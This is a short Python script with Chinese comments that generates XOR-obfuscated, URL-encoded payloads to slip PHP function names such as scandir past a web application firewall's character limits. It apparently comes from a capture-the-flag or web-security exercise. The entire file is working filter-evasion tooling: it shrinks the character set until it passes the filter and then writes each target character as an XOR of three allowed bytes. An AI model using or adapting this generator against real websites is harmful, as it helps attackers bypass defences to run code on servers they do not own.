def xor(cmd):
    """
    构造一次异或payload
    :param cmd: shell
    :return: 返回payload
    """
    payload = []

    for i in cmd:
        tmp = ord(i) ^ 0xff
        payload.append(tmp)

    results = list(set(payload))
    results.append(0xd1)  # 存放字符串异或后的值

    print("cmd", payload)
    print("total", results)
    return results


def cut_down(results=None, deletes=None):
    """
    将字符缩减到可以通过waf的数量
    两个参数原始值都是shell与0xff异或得到的无重复字符列表
    :param results: 原始字符列表
    :param deletes: 待缩减字符列表
    :return: 返回两个值，一个是尝试删去某个字符后剩余字符可表示的字符数量，另一个是可表示字符列表
    """
    if deletes is None:
        deletes = []
    if results is None:
        results = []

    temp = []
    for d in results:
        for a in deletes:
            for b in deletes:
                for c in deletes:
                    if a ^ b ^ c == d:
                        if a == b == c == d:
                            continue
                        else:
                            # print("a=0x%x, b=0x%x, c=0x%x, d=0x%x" % (a, b, c, d))
                            if d not in temp:
                                temp.append(d)
    print(len(temp), temp)
    return len(temp), temp


def get_payload(cmd, char_list=None):
    """
    获取payload
    :param cmd: 待构造的shell
    :param char_list: 可用的字符列表
    :return: 以string形式返回构造好的payload
    """
    if char_list is None:
        char_list = []

    a1 = ""
    a2 = ""
    a3 = ""
    a4 = ""

    # tag用于标记是否已求出这个字符的异或表达式
    # 0 未求出 1 已求出
    # 因为存在一值多解，所以通过tag来确定是否退出循环
    tag = 0

    for char in cmd:
        if tag == 1:
            tag = 0
        for a in char_list:
            # 该字符已找到匹配值
            if tag == 1:
                break
            for b in char_list:
                if tag == 1:
                    break
                for c in char_list:
                    if a ^ b ^ c ^ 0xff == ord(char):
                        a1 += hex(a)
                        a2 += hex(b)
                        a3 += hex(c)
                        a4 += '0xff'
                        tag = 1
                        break

    # 更换为url编码
    a1 = a1.replace('0x', '%')
    a2 = a2.replace('0x', '%')
    a3 = a3.replace('0x', '%')
    a4 = a4.replace('0x', '%')

    res = '(' + a1 + ')^(' + a2 + ')^(' + a3 + ')^(' + a4 + ')'
    print(res)

    return res


# 这一行就是我们总共的字符串。比如print_rscandir。将重复的字符串去掉。就是所有要用到的字符串
# 这里的值是和ff异或后的十进制表示
result = [160, 139, 140, 141, 143, 145, 150, 155, 156, 158, 209]

# 一开始，result数组和delete是相同的。当我们减去末尾209的时候。
# 看程序返回的len(temp) == len(result)。如果相等。那么就说明这个字符可以由其他字符异或替代，可以删去
# 如果长度改变。那么就恢复。继续尝试删其他的字符
delete = [160, 139, 140, 141, 143, 145, 156, 209]  # 这个列表就是缩减完成后的一种
# delete = [160, 139, 140, 141, 143, 145, 150, 155, 156, 158, 209]

cmds = 'scandir'

# cut_down(result, delete)  # 缩减字符种类

get_payload(cmds, delete)  # 获取payload
